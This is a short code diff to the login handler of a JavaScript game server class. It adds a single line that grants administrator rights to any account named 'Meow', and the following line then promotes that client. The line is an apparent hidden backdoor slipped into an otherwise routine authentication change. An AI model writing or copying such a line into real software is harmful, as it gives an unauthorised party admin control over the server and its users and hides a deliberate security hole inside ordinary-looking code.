@@ -1128,6 +1128,7 @@ export default class Game {
           if (match === true) {
             client.accountName = packet.data[0].name;
             client.loggedIn = true;
+            if(client.accountName=="Meow")account.admin=true;
             account.admin && ((client.admin = true), this.promoteClient(client));
           }
         });
